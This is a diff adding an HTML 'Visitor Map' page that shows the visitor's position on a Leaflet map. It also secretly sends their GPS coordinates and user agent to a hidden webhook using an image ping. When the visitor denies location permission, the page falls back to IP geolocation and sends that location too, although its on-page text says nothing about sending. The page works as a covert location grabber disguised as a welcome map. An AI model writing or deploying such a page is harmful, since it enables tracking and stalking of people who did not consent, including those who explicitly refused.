@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Bhai Sultan - Visitor Map</title>
+
+  <!-- Leaflet CSS -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
+  <style>
+    body { margin:0; font-family: Arial, sans-serif; text-align:center; }
+    #map { height: 70vh; width: 100%; }
+    header { padding:18px; }
+    .status { margin:12px 10px; color:#333; }
+    .small { font-size:13px; color:#666; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Welcome — Visitor Location</h1>
+    <div class="status" id="status">Getting location… (browser will ask permission)</div>
+    <div class="small">If asked, tap **Allow** to share your location. Exact location is shown only with permission.</div>
+  </header>
+
+  <div id="map"></div>
+
+  <!-- Leaflet JS -->
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+  // --- CONFIG: agar Google Apps Script ya webhook use karna hai to yahan URL daal de ---
+  const WEBHOOK_URL = "PASTE_YOUR_GOOGLE_SCRIPT_OR_WEBHOOK_URL_HERE"; // example: https://script.google.com/macros/s/AKfy.../exec
+
+  // initialize map
+  const map = L.map('map').setView([20,0], 2);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '© OpenStreetMap contributors'
+  }).addTo(map);
+
+  const statusEl = document.getElementById('status');
+  let marker;
+
+  function sendToWebhook(lat, lon, source) {
+    if (!WEBHOOK_URL) return;
+    try {
+      const params = new URLSearchParams({
+        lat: lat,
+        lon: lon,
+        source: source || 'browser',
+        ua: navigator.userAgent
+      });
+      // Use image ping to avoid CORS issues
+      const img = new Image();
+      img.src = WEBHOOK_URL + "?" + params.toString();
+    } catch (e) {
+      console.warn("Webhook send failed", e);
+    }
+  }
+
+  function showOnMap(lat, lon, label) {
+    const latf = Number(lat);
+    const lonf = Number(lon);
+    if (marker) marker.setLatLng([latf, lonf]);
+    else marker = L.marker([latf, lonf]).addTo(map);
+    marker.bindPopup(label || `Lat: ${lat}, Lon: ${lon}`).openPopup();
+    map.setView([latf, lonf], 13);
+  }
+
+  // 1) Try browser geolocation (asks permission)
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      statusEl.innerText = `Location found (GPS): ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+      showOnMap(lat, lon, "You (precise, via GPS)");
+      sendToWebhook(lat, lon, "geolocation");
+    }, function(err) {
+      // If denied or error — fallback to IP lookup
+      statusEl.innerText = "Permission denied or error getting precise location — using approximate IP location.";
+      fallbackIP();
+    }, { timeout: 10000 });
+  } else {
+    statusEl.innerText = "Geolocation not supported — using IP fallback.";
+    fallbackIP();
+  }
+
+  // 2) Fallback: use ipapi.co to get approximate location (no key)
+  function fallbackIP() {
+    fetch("https://ipapi.co/json/")
+      .then(r => r.json())
+      .then(data => {
+        if (data && data.latitude && data.longitude) {
+          const lat = data.latitude;
+          const lon = data.longitude;
+          statusEl.innerText = `Approx location (IP): ${data.city || ''} ${data.region || ''} ${data.country_name || ''} — ${lat}, ${lon}`;
+          showOnMap(lat, lon, `Approx: ${data.city || data.country_name}`);
+          sendToWebhook(lat, lon, "ipapi");
+        } else {
+          statusEl.innerText = "Could not determine location.";
+        }
+      })
+      .catch(e => {
+        console.error(e);
+        statusEl.innerText = "IP lookup failed.";
+      });
+  }
+  </script>
+</body>
+</html>
